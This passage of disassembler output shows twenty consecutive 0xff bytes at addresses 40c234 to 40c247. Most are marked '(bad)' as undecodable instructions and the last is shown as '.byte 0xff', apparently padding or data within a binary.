  40c234:	ff                   	(bad)
  40c235:	ff                   	(bad)
  40c236:	ff                   	(bad)
  40c237:	ff                   	(bad)
  40c238:	ff                   	(bad)
  40c239:	ff                   	(bad)
  40c23a:	ff                   	(bad)
  40c23b:	ff                   	(bad)
  40c23c:	ff                   	(bad)
  40c23d:	ff                   	(bad)
  40c23e:	ff                   	(bad)
  40c23f:	ff                   	(bad)
  40c240:	ff                   	(bad)
  40c241:	ff                   	(bad)
  40c242:	ff                   	(bad)
  40c243:	ff                   	(bad)
  40c244:	ff                   	(bad)
  40c245:	ff                   	(bad)
  40c246:	ff                   	(bad)
  40c247:	ff                   	.byte 0xff
